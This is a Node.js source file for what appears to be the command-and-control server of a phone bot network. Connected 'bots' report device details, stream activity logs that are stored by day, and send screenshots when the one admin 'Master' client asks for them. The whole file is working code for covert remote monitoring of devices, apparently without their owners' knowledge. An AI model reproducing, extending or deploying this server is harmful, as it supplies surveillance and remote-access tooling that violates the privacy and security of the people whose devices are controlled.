import 'dotenv/config'

import express from "express";
import { Server } from "socket.io";
import bodyParser from 'body-parser';
import cors from 'cors'
import chalk from "chalk";

import webRoute from "./routes/webRoutes.js";
import { db } from './db.js';
import { promises as fs } from "fs";

// Variables
const portBots = 4000
const portMaster = 4001
let adminSoc = null;
let devices = new Map(); // Map<device_uuid, {info: data, socket: socket}>
// Variables

// Express
const app = express()
app.use(cors())
app.use(bodyParser.urlencoded({ extended: true }))
app.use(express.static('static'))
app.use('/screenshots', express.static('screenshots', { maxAge: '1h' }))
app.use('/', webRoute)

app.post("/info", (req, res) => {
    const device = devices.get(req.body.id);
    if (device) {
        res.json(device.info)
    } else {
        res.status(404).json({ error: "Device not found" })
    }
})

const masterServer = app.listen(portMaster, "0.0.0.0", () => {
    console.log(`Master Network listening on http://0.0.0.0:${portMaster}/`)
    // DB initialized on import
})

// Socket io Connection for BOTS
const botIo = new Server(portBots)
console.log(`Bot Network listening on http://0.0.0.0:${portBots}/`)

botIo.on("connection", async (socket) => {
    try {
        const dataStr = socket.handshake.query.info;
        if (!dataStr) {
            socket.disconnect();
            return;
        }
        const data = JSON.parse(dataStr);
        const deviceUuid = data.device_uuid;
        if (!deviceUuid) {
            socket.disconnect();
            return;
        }

        socket.deviceUuid = deviceUuid;

        let device = devices.get(deviceUuid);
        if (device) {
            // Update existing
            device.info = data;
            device.socket = socket;
            device.connected = true;
            if (!device.logs) {
                device.logs = [];
            }
        } else {
            // New device
            device = {
                info: data,
                socket: socket,
                connected: true,
                logs: []
            };
            devices.set(deviceUuid, device);
        }

        // UPSERT device info in DB
        await db.run(
            'INSERT OR REPLACE INTO devices (device_uuid, brand, model, manufacturer, connected_at, last_seen) VALUES (?, ?, ?, ?, ?, ?)',
            deviceUuid, data.Brand, data.Model, data.Manufacturer, Date.now(), Date.now()
        ).catch(console.error);

        console.log(chalk.green(`[+] Bot Connected (${deviceUuid}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))
        console.log(chalk.blue(`[i] Device ${deviceUuid} status updated to: connected = ${device.connected}`))

        if (adminSoc) {
            const deviceList = Array.from(devices.values()).map((d) => ({
                ...d.info,
                ID: d.info.device_uuid,
                connected: d.connected
            })).slice(0, 20);
            adminSoc.emit("info", deviceList);
            console.log(chalk.blue(`[i] Status update sent to frontend (${deviceList.filter(d => d.connected).length} connected devices)`));
        } else {
            console.log(chalk.yellow(`[w] Frontend not connected - status update will be sent when frontend connects`));
        }

        socket.on("disconnect", async () => {
            const deviceUuid = socket.deviceUuid;
            if (deviceUuid) {
                const device = devices.get(deviceUuid);
                if (device) {
                    device.socket = null;
                    device.connected = false;
                }

                // Update last_seen in DB
                await db.run('UPDATE devices SET last_seen = ? WHERE device_uuid = ?', Date.now(), deviceUuid).catch(console.error);

                console.log(chalk.redBright(`[x] Bot Disconnected (${deviceUuid})`))
                if (adminSoc) {
                    const deviceList = Array.from(devices.values()).map((d) => ({
                        ...d.info,
                        ID: d.info.device_uuid,
                        connected: d.connected
                    })).slice(0, 20);
                    adminSoc.emit("info", deviceList);
                }
            }
        })

        socket.on("logger", async (data) => {
            const deviceUuid = socket.deviceUuid;
            if (!deviceUuid) return;
            const device = devices.get(deviceUuid);
            if (!device) return;
            try {
                // console.log(`Logger from device ${deviceUuid}: ${data}`);
                device.logs.push({ timestamp: Date.now(), log: data });
                if (adminSoc) {
                    adminSoc.emit("logger", { device: deviceUuid, log: data });
                }

                // Incremental storage: Append to daily logs
                const today = new Date().toISOString().split('T')[0]; // YYYY-MM-DD
                const row = await db.get('SELECT logs_data FROM device_daily_logs WHERE device_uuid = ? AND date = ?', deviceUuid, today);
                let existingLogs = '[]'; // Default empty array
                if (row && row.logs_data) {
                    existingLogs = row.logs_data;
                }
                const logsArray = JSON.parse(existingLogs);
                logsArray.push({ timestamp: Date.now(), log: data });
                const newLogsData = JSON.stringify(logsArray);

                await db.run(
                    'INSERT OR REPLACE INTO device_daily_logs (device_uuid, date, logs_data, updated_at) VALUES (?, ?, ?, ?)',
                    deviceUuid, today, newLogsData, Date.now()
                );
            } catch (err) {
                console.error('Logger storage error:', err)
            }
        })

        socket.on("screenshot_response", async (data) => {
            const deviceUuid = socket.deviceUuid;
            if (!deviceUuid || !adminSoc) return;
            try {
                if (!Buffer.isBuffer(data) && !(data instanceof ArrayBuffer)) {
                    throw new Error('Invalid image data: not a buffer');
                }
                const buffer = Buffer.from(data);
                if (buffer.length === 0) {
                    throw new Error('Empty image data');
                }

                // Generate filename with timestamp and device
                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                const filename = `screenshot-${deviceUuid}-${timestamp}.jpg`;
                const filepath = `screenshots/${filename}`;

                await fs.mkdir('screenshots', { recursive: true });
                await fs.writeFile(filepath, buffer);

                // Emit filename; frontend constructs full URL
                adminSoc.emit("screenshot_ready", {
                    device_uuid: deviceUuid,
                    filename: filename
                });

                console.log(`Screenshot saved: screenshots/${filename}`);
            } catch (err) {
                console.error('Screenshot response error:', err);
                adminSoc.emit("screenshot_error", { device_uuid: deviceUuid, error: err.message });
            }
        })
    } catch (error) {
        console.error('Connection error:', error);
        socket.disconnect();
    }
})

// Socket io Connection for Master
const masterIo = new Server(masterServer);
masterIo.on("connection", (socket) => {
    if (adminSoc == null) {
        console.log(chalk.greenBright(`[+] Master got Connected (${socket.id})`))
        adminSoc = socket
        const deviceList = Array.from(devices.values()).map((d) => ({
            ...d.info,
            ID: d.info.device_uuid,
            connected: d.connected
        })).slice(0, 20);
        socket.emit("info", deviceList); // Send current list on connect

        socket.on("get_device_logs", (id) => {
            const device = devices.get(id);
            if (device && device.logs) {
                socket.emit("device_logs", device.logs.map(l => l.log));
            } else {
                socket.emit("device_logs", []);
            }
        });

        setTimeout(() => {
            const currentDeviceList = Array.from(devices.values()).map((d) => ({
                ...d.info,
                ID: d.info.device_uuid,
                connected: d.connected
            })).slice(0, 20);

            socket.emit("info", currentDeviceList);
        }, 1000); // Esperar 1 segundo para asegurar que la conexión esté estable

        socket.on("screenshot_req", (deviceId) => {
            console.log(`Relaying screenshot request to device: ${deviceId}`);
            const device = devices.get(deviceId);
            if (device && device.socket) {
                device.socket.emit("screenshot");
                console.log(chalk.green(`Screenshot request sent to app.`))
            } else {
                console.log(chalk.red(`Device ${deviceId} not found or socket disconnected`))
            }
        });

        socket.on("disconnect", () => {
            console.log(chalk.red(`[x] Master got Disconnected (${socket.id})`))
            adminSoc = null
        })

    } else {
        socket.disconnect()
    }
})
